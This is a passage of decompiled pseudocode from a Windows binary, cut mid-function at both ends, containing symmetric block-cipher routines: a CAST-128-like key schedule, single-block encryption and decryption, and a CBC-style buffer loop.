        v29 = BYTE2(v23);
        v30 = BYTE1(v23);
        v32 = HIBYTE(v24);
        v33 = BYTE2(v24);
        v34 = BYTE1(v24);
        ++v12;
        v31 = v23;
        v35 = v24;
      }
      result = v13;
      a1[v20] = *a1 ^ *(&v28 + v13);
      ++a1;
      v13 = ((_BYTE)v13 + 1) & 7;
    }
    while ( a3 );
    v8 = v26;
    if ( v12 )
    {
      *v27 = HIBYTE(v14);
      a5[1] = BYTE2(v14);
      a5[2] = BYTE1(v14);
      a5[3] = v22;
      a5[4] = HIBYTE(v17);
      result = HIWORD(v17);
      a5[5] = BYTE2(v17);
      a5[6] = BYTE1(v17);
      a5[7] = v21;
    }
  }
  *v8 = v13;
  return result;
}

//----- (000000014008CA00) ----------------------------------------------------
__int64 __fastcall sub_14008CA00(__int64 a1, int a2, __int64 a3)
{
  int v3; // r11d
  __int64 v4; // rdx
  __int64 v5; // r10
  __int64 v6; // r8
  bool v7; // zf
  bool v8; // sf
  bool v9; // of
  __int64 v10; // r11
  int v11; // edi
  int v12; // r14d
  int v13; // r13d
  __int64 v14; // r14
  int v15; // r12d
  __int64 v16; // r9
  int v17; // ebx
  __int64 v18; // r15
  __int64 v19; // r10
  unsigned int v20; // edx
  __int64 v21; // rsi
  __int64 v22; // rdi
  int v23; // ecx
  __int64 v24; // r9
  int v25; // edx
  __int64 v26; // r13
  __int64 v27; // r12
  __int64 v28; // r11
  __int64 v29; // r10
  __int64 v30; // r8
  __int64 v31; // rbx
  int v32; // ecx
  int v33; // edx
  __int64 v34; // rcx
  __int64 v35; // r13
  __int64 v36; // rdi
  __int64 v37; // rsi
  __int64 v38; // r11
  __int64 v39; // rbx
  __int64 v40; // r10
  int v41; // edx
  __int64 v42; // r9
  __int64 v43; // rbx
  int v44; // edx
  __int64 v45; // r8
  int v46; // edx
  __int64 v47; // rbx
  __int64 v48; // rsi
  __int64 v49; // r10
  __int64 v50; // r9
  __int64 v51; // r9
  __int64 v52; // r8
  __int64 v53; // r10
  __int64 v54; // rbx
  __int64 v55; // r14
  __int64 v56; // rdx
  __int64 v57; // r9
  __int64 v58; // r10
  __int64 v59; // r9
  __int64 v60; // r13
  __int64 v61; // r12
  __int64 v62; // r11
  __int64 v63; // r10
  __int64 v64; // rbx
  __int64 v65; // r8
  __int64 v66; // r11
  __int64 v67; // r13
  __int64 v68; // rdi
  __int64 v69; // rsi
  __int64 v70; // rbx
  __int64 v71; // r9
  __int64 v72; // r11
  __int64 v73; // rcx
  __int64 v74; // r13
  __int64 v75; // r15
  __int64 result; // rax
  __int64 v77; // r11
  __int64 v78; // r14
  __int64 v79; // r9
  int *v80; // rdx
  int v81; // ecx
  unsigned int v82; // [rsp+0h] [rbp-100h]
  int v83; // [rsp+0h] [rbp-100h]
  int v84; // [rsp+0h] [rbp-100h]
  unsigned int v85; // [rsp+0h] [rbp-100h]
  unsigned int v86; // [rsp+0h] [rbp-100h]
  int v87; // [rsp+4h] [rbp-FCh]
  unsigned int v88; // [rsp+4h] [rbp-FCh]
  int v89; // [rsp+4h] [rbp-FCh]
  unsigned int v90; // [rsp+4h] [rbp-FCh]
  int v91; // [rsp+4h] [rbp-FCh]
  int v92; // [rsp+4h] [rbp-FCh]
  unsigned int v93; // [rsp+8h] [rbp-F8h]
  unsigned int v94; // [rsp+8h] [rbp-F8h]
  int v95; // [rsp+8h] [rbp-F8h]
  unsigned int v96; // [rsp+8h] [rbp-F8h]
  unsigned int v97; // [rsp+8h] [rbp-F8h]
  int v98; // [rsp+8h] [rbp-F8h]
  unsigned int v99; // [rsp+Ch] [rbp-F4h]
  unsigned int v100; // [rsp+Ch] [rbp-F4h]
  int v101; // [rsp+Ch] [rbp-F4h]
  int v102; // [rsp+Ch] [rbp-F4h]
  __int64 v103; // [rsp+10h] [rbp-F0h]
  __int64 v104; // [rsp+10h] [rbp-F0h]
  __int64 v105; // [rsp+18h] [rbp-E8h]
  __int64 v106; // [rsp+20h] [rbp-E0h]
  __int64 v107; // [rsp+20h] [rbp-E0h]
  __int64 v108; // [rsp+20h] [rbp-E0h]
  __int64 v109; // [rsp+20h] [rbp-E0h]
  __int64 v110; // [rsp+28h] [rbp-D8h]
  __int64 v111; // [rsp+28h] [rbp-D8h]
  __int64 v112; // [rsp+28h] [rbp-D8h]
  __int64 v113; // [rsp+28h] [rbp-D8h]
  __int64 v114; // [rsp+28h] [rbp-D8h]
  __int64 v115; // [rsp+28h] [rbp-D8h]
  __int64 v116; // [rsp+30h] [rbp-D0h]
  __int64 v117; // [rsp+30h] [rbp-D0h]
  __int64 v118; // [rsp+30h] [rbp-D0h]
  __int64 v119; // [rsp+30h] [rbp-D0h]
  __int64 v120; // [rsp+38h] [rbp-C8h]
  __int64 v121; // [rsp+38h] [rbp-C8h]
  __int64 v122; // [rsp+38h] [rbp-C8h]
  __int64 v123; // [rsp+38h] [rbp-C8h]
  __int64 v124; // [rsp+40h] [rbp-C0h]
  __int64 v125; // [rsp+40h] [rbp-C0h]
  __int64 v126; // [rsp+40h] [rbp-C0h]
  __int64 v127; // [rsp+40h] [rbp-C0h]
  __int64 v128; // [rsp+40h] [rbp-C0h]
  __int64 v129; // [rsp+48h] [rbp-B8h]
  __int64 v130; // [rsp+48h] [rbp-B8h]
  __int64 v131; // [rsp+48h] [rbp-B8h]
  __int64 v132; // [rsp+48h] [rbp-B8h]
  __int64 v133; // [rsp+48h] [rbp-B8h]
  __int64 v134; // [rsp+50h] [rbp-B0h]
  __int64 v135; // [rsp+50h] [rbp-B0h]
  __int64 v136; // [rsp+50h] [rbp-B0h]
  __int64 v137; // [rsp+58h] [rbp-A8h]
  __int64 v138; // [rsp+60h] [rbp-A0h]
  __int64 v139; // [rsp+60h] [rbp-A0h]
  __int64 v140; // [rsp+60h] [rbp-A0h]
  __int64 v142; // [rsp+80h] [rbp-80h]
  __int64 v143; // [rsp+88h] [rbp-78h]
  __int64 v144; // [rsp+90h] [rbp-70h]
  __int64 v145; // [rsp+98h] [rbp-68h]
  __int64 v146; // [rsp+A0h] [rbp-60h]
  __int64 v147; // [rsp+A8h] [rbp-58h]
  __int64 v148; // [rsp+B0h] [rbp-50h]
  __int64 i; // [rsp+B8h] [rbp-48h]
  int v150[32]; // [rsp+C0h] [rbp-40h] BYREF

  v3 = 16;
  v142 = 0i64;
  v143 = 0i64;
  if ( a2 <= 16 )
    v3 = a2;
  v144 = 0i64;
  v145 = 0i64;
  v146 = 0i64;
  v4 = 0i64;
  v147 = 0i64;
  v148 = 0i64;
  for ( i = 0i64; v4 < v3; ++v4 )
    *((_DWORD *)&v142 + v4) = *(unsigned __int8 *)(v4 + a3);
  v5 = (unsigned int)v148;
  v6 = (unsigned int)i;
  v9 = __OFSUB__(v3, 10);
  v7 = v3 == 10;
  v8 = v3 - 10 < 0;
  v10 = (unsigned int)v146;
  v11 = v142;
  *(_DWORD *)(a1 + 128) = v8 ^ v9 | v7;
  v12 = dword_140115910[v10] ^ dword_140115910[v5] ^ dword_140115110[HIDWORD(v148)] ^ dword_140115D10[v6] ^ dword_140115510[HIDWORD(i)];
  v93 = (HIDWORD(v143) | (((unsigned int)v143 | ((HIDWORD(v142) | (v11 << 8)) << 8)) << 8)) ^ v12;
  v134 = BYTE2(v93);
  v106 = HIBYTE(v93);
  v103 = BYTE1(v93);
  v116 = (unsigned __int8)(BYTE4(v143) ^ v12);
  v82 = dword_140115910[v134] ^ (HIDWORD(v147) | (((unsigned int)v147 | ((HIDWORD(v146) | ((_DWORD)v10 << 8)) << 8)) << 8)) ^ dword_140115110[v106] ^ dword_140115510[v103] ^ dword_140115D10[v116] ^ dword_140115D10[(unsigned int)v147];
  v137 = HIBYTE(v82);
  v13 = dword_140115910[BYTE2(v82)];
  v14 = 4i64 * BYTE1(v82);
  v15 = *(int *)((char *)dword_140115510 + v14);
  v105 = 4i64
       * (unsigned __int8)(LOBYTE(dword_140115910[v134]) ^ BYTE4(v147) ^ LOBYTE(dword_140115110[v106]) ^ LOBYTE(dword_140115510[v103]) ^ LOBYTE(dword_140115D10[v116]) ^ LOBYTE(dword_140115D10[(unsigned int)v147]));
  LODWORD(v5) = dword_140115D10[v137] ^ v13 ^ v15 ^ (HIDWORD(i) | (((unsigned int)v6 | ((HIDWORD(v148) | ((_DWORD)v5 << 8)) << 8)) << 8)) ^ *(int *)((char *)dword_140115110 + v105) ^ dword_140115110[HIDWORD(v146)];
  v16 = (unsigned __int8)v5;
  v87 = v5;
  v17 = dword_140115110[BYTE1(v5)];
  v18 = 4i64 * BYTE2(v5);
  LODWORD(v10) = *(int *)((char *)dword_140115510 + v18);
  v19 = 4i64 * BYTE3(v5);
  v20 = v10 ^ v17 ^ (HIDWORD(v145) | (((unsigned int)v145 | ((HIDWORD(v144) | ((_DWORD)v144 << 8)) << 8)) << 8)) ^ *(int *)((char *)dword_140115D10 + v19) ^ dword_140115910[v16] ^ dword_140115510[HIDWORD(v147)];
  v21 = (unsigned __int8)(v10 ^ v17 ^ BYTE4(v145) ^ *((_BYTE *)dword_140115D10 + v19) ^ LOBYTE(dword_140115910[v16]) ^ LOBYTE(dword_140115510[HIDWORD(v147)]));
  v22 = BYTE1(v20);
  LODWORD(v14) = *(int *)((char *)dword_140115D10 + v14);
  v99 = v20;
  v150[0] = v10 ^ v14 ^ dword_140115110[v103] ^ *(int *)((char *)dword_140115910 + v105) ^ *(int *)((char *)dword_140115110
                                                                                                  + v19);
  v23 = dword_140115510[v16];
  v24 = 4i64 * HIBYTE(v20);
  v25 = *(int *)((char *)dword_140115910 + v18) ^ *(int *)((char *)dword_140115110 + v24) ^ dword_140115510[BYTE2(v20)];
  LODWORD(v6) = dword_140115510[v21] ^ dword_140115110[v22];
  v150[1] = dword_140115D10[v137] ^ v13 ^ v15 ^ v17 ^ v23;
  LODWORD(v10) = dword_140115D10[v103];
  LODWORD(v6) = *(int *)((char *)dword_140115D10 + v24) ^ v6;
  v150[2] = v10 ^ dword_140115910[v116] ^ v25;
  v88 = v14 ^ v87 ^ dword_140115910[v106] ^ dword_140115910[v137] ^ dword_140115110[BYTE2(v82)] ^ *(int *)((char *)dword_140115510 + v105);
  v150[3] = dword_140115910[v134] ^ dword_140115D10[v106] ^ v6;
  LODWORD(v14) = dword_140115510[BYTE1(v88)];
  LODWORD(v19) = v93 ^ v10 ^ v14 ^ dword_140115D10[(unsigned __int8)v88] ^ dword_140115910[BYTE2(v88)] ^ dword_140115110[HIBYTE(v88)];
  LODWORD(v18) = dword_140115110[(unsigned __int8)v19];
  LODWORD(v21) = dword_140115510[BYTE1(v19)];
  v124 = (unsigned __int8)v19;
  v26 = BYTE2(v19);
  LODWORD(v105) = v19;
  v27 = 4i64 * BYTE3(v19);
  LODWORD(v24) = v82 ^ v18 ^ v21 ^ dword_140115110[v134] ^ dword_140115910[v26] ^ *(int *)((char *)dword_140115D10 + v27);
  v28 = 4i64 * BYTE3(v24);
  v94 = v99 ^ *(int *)((char *)dword_140115D10 + v28) ^ dword_140115510[v116] ^ dword_140115110[BYTE1(v24)] ^ dword_140115510[BYTE2(v24)] ^ dword_140115910[(unsigned __int8)v24];
  v110 = BYTE1(v24);
  v135 = BYTE2(v24);
  v29 = 4i64 * (unsigned __int8)v94;
  LODWORD(v22) = dword_140115910[HIBYTE(v94)];
  v30 = 4i64 * BYTE1(v94);
  v31 = 4i64 * BYTE2(v94);
  v150[4] = v22 ^ v14 ^ *(int *)((char *)dword_140115D10 + v31) ^ *(int *)((char *)dword_140115110 + v28) ^ dword_140115110[(unsigned __int8)v88];
  v32 = *(int *)((char *)dword_140115D10 + v29) ^ *(int *)((char *)dword_140115910 + v30) ^ *(int *)((char *)dword_140115510 + v31) ^ dword_140115110[BYTE2(v88)] ^ dword_140115510[HIBYTE(v88)];
  v33 = *(int *)((char *)dword_140115910 + v28);
  LODWORD(v31) = v33 ^ v88 ^ *(int *)((char *)dword_140115510 + v29) ^ *(int *)((char *)dword_140115D10 + v30) ^ *(int *)((char *)dword_140115110 + v31);
  v150[5] = v32;
  v34 = 4i64 * (unsigned __int8)v88;
  v89 = v22 ^ v31;
  v150[6] = v33 ^ v18 ^ v21 ^ dword_140115D10[v135] ^ *(int *)((char *)dword_140115910 + v34);
  LODWORD(v28) = dword_140115D10[v110];
  v150[7] = dword_140115910[v110] ^ dword_140115D10[(unsigned __int8)v24] ^ dword_140115D10[v124] ^ dword_140115110[v26] ^ *(int *)((char *)dword_140115510 + v27);
  v111 = (unsigned __int8)(((unsigned int)v22 ^ (unsigned int)v31) >> 16);
  v125 = ((unsigned int)v22 ^ (unsigned int)v31) >> 24;
  LODWORD(v27) = dword_140115510[(unsigned __int8)((unsigned __int16)(v22 ^ v31) >> 8)];
  v120 = (unsigned __int8)((unsigned __int16)(v22 ^ v31) >> 8);
  v117 = (unsigned __int8)(v22 ^ v31);
  v100 = v27 ^ v24 ^ dword_140115110[v125] ^ dword_140115910[v111] ^ dword_140115D10[v117] ^ v28;
  v35 = 4i64 * BYTE2(v100);
  v104 = 4i64 * HIBYTE(v100);
  LODWORD(v18) = dword_140115510[BYTE1(v100)];
  LODWORD(v14) = dword_140115110[(unsigned __int8)v100];
  v129 = (unsigned __int8)v100;
  LODWORD(v29) = v18 ^ v14 ^ v94 ^ *(int *)((char *)dword_140115D10 + v104) ^ *(int *)((char *)dword_140115910 + v35) ^ dword_140115110[v135];
  v36 = 4i64 * (unsigned __int8)v29;
  v83 = v29;
  v37 = BYTE1(v29);
  v38 = 4i64 * BYTE2(v29);
  v39 = BYTE3(v29);
  LODWORD(v24) = v105 ^ dword_140115D10[v39] ^ *(int *)((char *)dword_140115510 + v38) ^ dword_140115110[v37] ^ *(int *)((char *)dword_140115910 + v36) ^ dword_140115510[(unsigned __int8)v24];
  v40 = (unsigned __int8)v24;
  LODWORD(v30) = BYTE1(v24);
  v41 = BYTE2(v24);
  v95 = v24;
  v42 = 4i64 * BYTE3(v24);
  v150[8] = v27 ^ dword_140115110[v117] ^ *(int *)((char *)dword_140115110 + v38) ^ *(int *)((char *)dword_140115910
                                                                                           + v42) ^ dword_140115D10[v41];
  LODWORD(v105) = dword_140115110[v111];
  LODWORD(v34) = dword_140115910[v39] ^ *(int *)((char *)dword_140115D10 + v38);
  v43 = v120 * 4;
  v150[9] = v105 ^ dword_140115510[v125] ^ *(int *)((char *)dword_140115510 + v42) ^ dword_140115D10[v40] ^ dword_140115910[(unsigned int)v30];
  LODWORD(v30) = *(int *)((char *)dword_140115110 + v35);
  v150[10] = v18 ^ v14 ^ dword_140115910[v120] ^ v34;
  v44 = dword_140115D10[BYTE1(v100)];
  v150[11] = v44 ^ v30 ^ *(int *)((char *)dword_140115510 + v104) ^ dword_140115910[v37] ^ *(int *)((char *)dword_140115D10
                                                                                                  + v36);
  LODWORD(v38) = v44 ^ v30 ^ v83 ^ dword_140115910[v125] ^ *(int *)((char *)dword_140115910 + v104) ^ dword_140115510[v129];
  v121 = BYTE3(v38);
  v45 = 4i64
      * (unsigned __int8)((unsigned __int16)(v44 ^ v30 ^ v83 ^ LOWORD(dword_140115910[v125]) ^ *(_WORD *)((char *)dword_140115910 + v104) ^ LOWORD(dword_140115510[v129])) >> 8);
  v46 = dword_140115910[BYTE2(v38)];
  v90 = v89 ^ v46 ^ *(int *)((char *)dword_140115D10 + v43) ^ dword_140115D10[(unsigned __int8)v38] ^ *(int *)((char *)dword_140115510 + v45) ^ dword_140115110[v121];
  v112 = (unsigned __int8)v38;
  v126 = v45;
  LODWORD(v27) = dword_140115D10[HIBYTE(v90)];
  LODWORD(v35) = dword_140115910[BYTE2(v90)];
  v130 = (unsigned __int8)v90;
  LODWORD(v105) = v100 ^ v105 ^ v35 ^ v27 ^ dword_140115110[v130] ^ dword_140115510[BYTE1(v90)];
  v47 = 4i64 * (unsigned __int8)v105;
  LODWORD(v104) = v38;
  v48 = 4i64 * BYTE3(v105);
  LODWORD(v38) = dword_140115110[BYTE1(v105)];
  LODWORD(v42) = dword_140115510[BYTE2(v105)];
  v138 = BYTE2(v105);
  v96 = v38 ^ v42 ^ v95 ^ *(int *)((char *)dword_140115D10 + v48) ^ dword_140115510[v117] ^ *(int *)((char *)dword_140115910 + v47);
  v150[12] = v42 ^ *(int *)((char *)dword_140115110 + v48) ^ dword_140115110[v112] ^ dword_140115910[v130] ^ dword_140115D10[BYTE1(v90)];
  v49 = BYTE2(v96);
  v101 = *(int *)((char *)dword_140115510 + v47);
  v50 = HIBYTE(v96);
  v150[13] = v101 ^ v35 ^ v27 ^ v38 ^ dword_140115510[v130];
  LODWORD(v38) = *(int *)((char *)dword_140115910 + v48);
  LODWORD(v45) = dword_140115510[(unsigned __int8)v96];
  LODWORD(v47) = v104 ^ dword_140115D10[BYTE1(v96)] ^ dword_140115110[v49] ^ dword_140115910[v50];
  v150[14] = v38 ^ dword_140115510[v49] ^ dword_140115110[v50] ^ dword_140115910[v112] ^ *(int *)((char *)dword_140115D10
                                                                                                + v126);
  LODWORD(v47) = v45 ^ v38 ^ v47;
  v51 = (unsigned __int8)v47;
  v84 = v47;
  v150[15] = v45 ^ v46 ^ dword_140115110[BYTE1(v96)] ^ dword_140115D10[v49] ^ dword_140115D10[v121];
  v52 = BYTE1(v47);
  v53 = 4i64 * BYTE3(v47);
  v54 = 4i64 * BYTE2(v47);
  v113 = v53;
  v107 = v52;
  v118 = v51;
  LODWORD(v38) = *(int *)((char *)dword_140115910 + v54) ^ v105 ^ *(int *)((char *)dword_140115110 + v53) ^ dword_140115510[v52] ^ dword_140115D10[v51] ^ dword_140115D10[BYTE1(v105)];
  v55 = 4i64 * BYTE1(v38);
  LODWORD(v105) = v38;
  LODWORD(v27) = *(int *)((char *)dword_140115510 + v55);
  v127 = v54;
  v131 = BYTE3(v38);
  LODWORD(v35) = dword_140115910[BYTE2(v38)];
  v122 = BYTE2(v38);
  v136 = (unsigned __int8)v38;
  LODWORD(v53) = dword_140115D10[v131] ^ v35 ^ v27 ^ v96 ^ dword_140115110[v136] ^ dword_140115110[v138];
  v56 = BYTE2(v53);
  v57 = (unsigned __int8)v53;
  LODWORD(v104) = v53;
  LODWORD(v54) = dword_140115110[BYTE1(v53)];
  LODWORD(v38) = dword_140115510[BYTE2(v53)];
  v58 = 4i64 * BYTE3(v53);
  v97 = v38 ^ v54 ^ v101 ^ v90 ^ *(int *)((char *)dword_140115D10 + v58) ^ dword_140115910[v57];
  LODWORD(v55) = *(int *)((char *)dword_140115D10 + v55);
  v150[16] = v38 ^ v55 ^ dword_140115110[v52] ^ dword_140115910[v136] ^ *(int *)((char *)dword_140115110 + v58);
  LODWORD(v34) = dword_140115510[v57];
  v59 = HIBYTE(v97);
  LODWORD(v56) = dword_140115910[v56] ^ dword_140115110[v59] ^ dword_140115510[BYTE2(v97)];
  LODWORD(v52) = dword_140115D10[v59] ^ dword_140115510[(unsigned __int8)v97] ^ dword_140115110[BYTE1(v97)];
  v150[17] = dword_140115D10[v131] ^ v35 ^ v27 ^ v54 ^ v34;
  LODWORD(v38) = dword_140115D10[v107];
  LODWORD(v58) = dword_140115510[v136];
  v150[18] = v38 ^ dword_140115910[v118] ^ v56;
  LODWORD(v104) = v55 ^ v104 ^ *(int *)((char *)dword_140115910 + v113) ^ dword_140115910[v131] ^ dword_140115110[v122] ^ v58;
  LODWORD(v55) = dword_140115510[BYTE1(v104)];
  v150[19] = *(int *)((char *)dword_140115910 + v127) ^ *(int *)((char *)dword_140115D10 + v113) ^ v52;
  v108 = (unsigned __int8)v104;
  LODWORD(v58) = v84 ^ v38 ^ v55 ^ dword_140115D10[v108] ^ dword_140115910[BYTE2(v104)] ^ dword_140115110[BYTE3(v104)];
  LODWORD(v18) = dword_140115110[(unsigned __int8)v58];
  LODWORD(v48) = dword_140115510[BYTE1(v58)];
  v91 = v58;
  v60 = BYTE2(v58);
  v114 = (unsigned __int8)v58;
  v61 = 4i64 * BYTE3(v58);
  LODWORD(v105) = v105 ^ v18 ^ v48 ^ *(int *)((char *)dword_140115110 + v127) ^ dword_140115910[v60] ^ *(int *)((char *)dword_140115D10 + v61);
  v62 = BYTE3(v105);
  v85 = v97 ^ dword_140115D10[v62] ^ dword_140115510[v118] ^ dword_140115110[BYTE1(v105)] ^ dword_140115510[BYTE2(v105)] ^ dword_140115910[(unsigned __int8)v105];
  v63 = 4i64 * (unsigned __int8)v85;
  v64 = 4i64 * BYTE2(v85);
  LODWORD(v36) = dword_140115910[HIBYTE(v85)];
  v65 = 4i64 * BYTE1(v85);
  v150[20] = v36 ^ v55 ^ *(int *)((char *)dword_140115D10 + v64) ^ dword_140115110[v62] ^ dword_140115110[v108];
  LODWORD(v34) = *(int *)((char *)dword_140115D10 + v63) ^ *(int *)((char *)dword_140115910 + v65) ^ *(int *)((char *)dword_140115510 + v64) ^ dword_140115110[BYTE2(v104)] ^ dword_140115510[BYTE3(v104)];
  LODWORD(v56) = dword_140115910[v62];
  v66 = 4i64 * BYTE1(v105);
  LODWORD(v64) = v56 ^ v104 ^ *(int *)((char *)dword_140115510 + v63) ^ *(int *)((char *)dword_140115D10 + v65) ^ *(int *)((char *)dword_140115110 + v64);
  v150[21] = v34;
  v98 = v36 ^ v64;
  v150[22] = v56 ^ v18 ^ v48 ^ dword_140115D10[BYTE2(v105)] ^ dword_140115910[v108];
  v150[23] = *(int *)((char *)dword_140115910 + v66) ^ dword_140115D10[(unsigned __int8)v105] ^ dword_140115D10[v114] ^ dword_140115110[v60] ^ *(int *)((char *)dword_140115510 + v61);
  v139 = (unsigned __int8)(((unsigned int)v36 ^ (unsigned int)v64) >> 16);
  v109 = ((unsigned int)v36 ^ (unsigned int)v64) >> 24;
  LODWORD(v61) = dword_140115510[(unsigned __int8)((unsigned __int16)(v36 ^ v64) >> 8)];
  v132 = (unsigned __int8)((unsigned __int16)(v36 ^ v64) >> 8);
  LODWORD(v66) = v105 ^ dword_140115110[v109] ^ dword_140115910[v139] ^ dword_140115D10[(unsigned __int8)(v36 ^ v64)] ^ *(int *)((char *)dword_140115D10 + v66);
  v119 = (unsigned __int8)(v36 ^ v64);
  v102 = v61 ^ v66;
  v67 = (unsigned __int8)(((unsigned int)v61 ^ (unsigned int)v66) >> 16);
  v128 = ((unsigned int)v61 ^ (unsigned int)v66) >> 24;
  LODWORD(v18) = dword_140115510[(unsigned __int8)((unsigned __int16)(v61 ^ v66) >> 8)];
  v115 = (unsigned __int8)((unsigned __int16)(v61 ^ v66) >> 8);
  LODWORD(v55) = dword_140115110[(unsigned __int8)(v61 ^ v66)];
  v123 = (unsigned __int8)(v61 ^ v66);
  LODWORD(v63) = v18 ^ v55 ^ v85 ^ dword_140115D10[v128] ^ dword_140115910[v67] ^ dword_140115110[BYTE2(v105)];
  v68 = (unsigned __int8)v63;
  v69 = BYTE1(v63);
  v70 = 4i64 * BYTE3(v63);
  v86 = v91 ^ *(int *)((char *)dword_140115D10 + v70) ^ dword_140115510[BYTE2(v63)] ^ dword_140115110[v69] ^ dword_140115910[v68] ^ dword_140115510[(unsigned __int8)v105];
  v71 = HIBYTE(v86);
  v150[24] = v61 ^ dword_140115110[v119] ^ dword_140115110[BYTE2(v63)] ^ dword_140115910[v71] ^ dword_140115D10[BYTE2(v86)];
  LODWORD(v105) = dword_140115110[v139];
  LODWORD(v34) = *(int *)((char *)dword_140115910 + v70) ^ dword_140115D10[BYTE2(v63)];
  v72 = v132 * 4;
  v150[25] = v105 ^ dword_140115510[v109] ^ dword_140115510[v71] ^ dword_140115D10[(unsigned __int8)v86] ^ dword_140115910[BYTE1(v86)];
  LODWORD(v65) = dword_140115110[v67];
  v150[26] = v18 ^ v55 ^ dword_140115910[v132] ^ v34;
  LODWORD(v56) = dword_140115D10[v115];
  v150[27] = v56 ^ v65 ^ dword_140115510[v128] ^ dword_140115910[v69] ^ dword_140115D10[v68];
  LODWORD(v63) = v56 ^ v65 ^ v63 ^ dword_140115910[v109] ^ dword_140115910[v128] ^ dword_140115510[v123];
  v140 = (unsigned __int8)v63;
  v73 = BYTE3(v63);
  v133 = BYTE1(v63);
  LODWORD(v56) = dword_140115910[BYTE2(v63)];
  LODWORD(v63) = v98 ^ v56 ^ *(int *)((char *)dword_140115D10 + v72) ^ dword_140115D10[v140] ^ dword_140115510[v133] ^ dword_140115110[v73];
  v92 = v56;
  v74 = (unsigned __int8)v63;
  LODWORD(v61) = dword_140115D10[BYTE3(v63)];
  v75 = BYTE1(v63);
  result = 0i64;
  LODWORD(v104) = dword_140115910[BYTE2(v63)];
  LODWORD(v63) = v102 ^ v105 ^ v104 ^ v61 ^ dword_140115110[v74] ^ dword_140115510[v75];
  v77 = (unsigned __int8)v63;
  LODWORD(v70) = dword_140115110[BYTE1(v63)];
  LODWORD(v65) = dword_140115510[BYTE2(v63)];
  v78 = BYTE3(v63);
  LODWORD(v63) = v70 ^ v65 ^ v86 ^ dword_140115D10[v78] ^ dword_140115510[v119] ^ dword_140115910[v77];
  v150[28] = v65 ^ dword_140115110[v78] ^ dword_140115110[v140] ^ dword_140115910[v74] ^ dword_140115D10[v75];
  v79 = BYTE2(v63);
  v150[29] = v104 ^ v61 ^ v70 ^ dword_140115510[v77] ^ dword_140115510[v74];
  LODWORD(v65) = dword_140115110[BYTE1(v63)] ^ dword_140115510[(unsigned __int8)v63];
  v150[30] = dword_140115510[v79] ^ dword_140115910[v78] ^ dword_140115910[v140] ^ dword_140115D10[v133] ^ dword_140115110[BYTE3(v63)];
  v80 = v150;
  v150[31] = v92 ^ dword_140115D10[v79] ^ dword_140115D10[v73] ^ v65;
  do
  {
    v81 = *v80++;
    *(_DWORD *)(result + a1) = v81;
    *(_DWORD *)(result + a1 + 4) = ((unsigned __int8)v80[15] - 16) & 0x1F;
    result += 8i64;
  }
  while ( result < 128 );
  return result;
}
// 140115110: using guessed type int dword_140115110[];
// 140115510: using guessed type int dword_140115510[];
// 140115910: using guessed type int dword_140115910[];
// 140115D10: using guessed type int dword_140115D10[];

//----- (000000014008E080) ----------------------------------------------------
__int64 __fastcall sub_14008E080(__int64 a1, _BYTE *a2, _DWORD *a3, int a4)
{
  int v6; // edx
  unsigned int v7; // r10d
  int v8; // eax
  int v9; // ecx
  int v10; // ecx
  char v11; // al
  int v12; // ecx
  __int64 result; // rax
  int v14; // [rsp+30h] [rbp+8h] BYREF
  int v15; // [rsp+34h] [rbp+Ch]

  v6 = *(unsigned __int8 *)(a1 + 4) << 24;
  v7 = _byteswap_ulong(*(_DWORD *)a1);
  v8 = *(unsigned __int8 *)(a1 + 5);
  v9 = *(unsigned __int8 *)(a1 + 6) << 8;
  v14 = v7;
  v15 = (v8 << 16) | v6 | *(unsigned __int8 *)(a1 + 7) | v9;
  if ( a4 )
    sub_14008EBA0(&v14, a3);
  else
    sub_14008E6C0(&v14, a3);
  v10 = v14;
  *a2 = HIBYTE(v14);
  a2[1] = BYTE2(v10);
  v11 = v14;
  a2[2] = BYTE1(v10);
  v12 = v15;
  a2[3] = v11;
  a2[4] = HIBYTE(v12);
  a2[5] = BYTE2(v12);
  result = (unsigned __int8)v15;
  a2[6] = BYTE1(v12);
  a2[7] = result;
  return result;
}

//----- (000000014008E150) ----------------------------------------------------
__int64 __fastcall sub_14008E150(__int64 a1, _BYTE *a2, unsigned int a3, _DWORD *a4, unsigned int *a5, int a6)
{
  unsigned int *v9; // rdi
  unsigned int v10; // esi
  unsigned int v11; // r10d
  unsigned int v12; // r8d
  unsigned __int64 v13; // r15
  int v14; // ecx
  int v15; // ecx
  __int64 v16; // r14
  int v17; // ecx
  int v18; // edx
  int v19; // eax
  int v20; // eax
  int v21; // eax
  int v22; // eax
  int v23; // eax
  __int64 result; // rax
  unsigned int *v25; // r15
  int v26; // edi
  unsigned int v27; // r12d
  unsigned int v28; // r13d
  unsigned __int64 v29; // r15
  unsigned int v30; // esi
  int v31; // edi
  int v32; // edi
  int v33; // ecx
  int v34; // edx
  char v35; // eax^3
  int v36; // ecx
  unsigned int v37; // esi
  int v38; // edx
  int v39; // edx
  int v40; // r8d
  _BYTE *v41; // rbx
  unsigned int v42; // [rsp+20h] [rbp-10h] BYREF
  unsigned int v43; // [rsp+24h] [rbp-Ch]
  unsigned int *v44; // [rsp+28h] [rbp-8h]
  _DWORD *v45; // [rsp+78h] [rbp+48h]
  int v46; // [rsp+88h] [rbp+58h]
  int v47; // [rsp+88h] [rbp+58h]

  v45 = a4;
  if ( a6 )
  {
    v9 = a5;
    v10 = a3 - 8;
    v44 = a5;
    v11 = _byteswap_ulong(*a5);
    v12 = _byteswap_ulong(a5[1]);
    if ( (int)(a3 - 8) >= 0 )
    {
      v13 = (unsigned __int64)(v10 + 8) >> 3;
      v10 -= 8 * ((v10 + 8) >> 3);
      do
      {
        v14 = (*(unsigned __int8 *)(a1 + 5) << 16) | (*(unsigned __int8 *)(a1 + 4) << 24);
        v42 = v11 ^ _byteswap_ulong(*(_DWORD *)a1);
        v15 = *(unsigned __int8 *)(a1 + 7) | (*(unsigned __int8 *)(a1 + 6) << 8) | v14;
        a1 += 8i64;
        v43 = v12 ^ v15;
        sub_14008EBA0((int *)&v42, v45);
        v11 = v42;
        v12 = v43;
        *a2 = HIBYTE(v42);
        a2[1] = BYTE2(v11);
        a2[2] = BYTE1(v11);
        a2[3] = v11;
        a2[4] = HIBYTE(v12);
        a2[5] = BYTE2(v12);
        a2[6] = BYTE1(v12);
        a2[7] = v12;
        a2 += 8;
        --v13;
      }
      while ( v13 );
      v9 = v44;
    }
    if ( v10 != -8 )
    {
      v16 = (int)(v10 + 8) + a1;
      v17 = 0;
      v18 = 0;
      switch ( v10 )
      {
        case 0xFFFFFFF9:
          goto LABEL_15;
        case 0xFFFFFFFA:
          goto LABEL_14;
        case 0xFFFFFFFB:
          goto LABEL_13;
        case 0xFFFFFFFC:
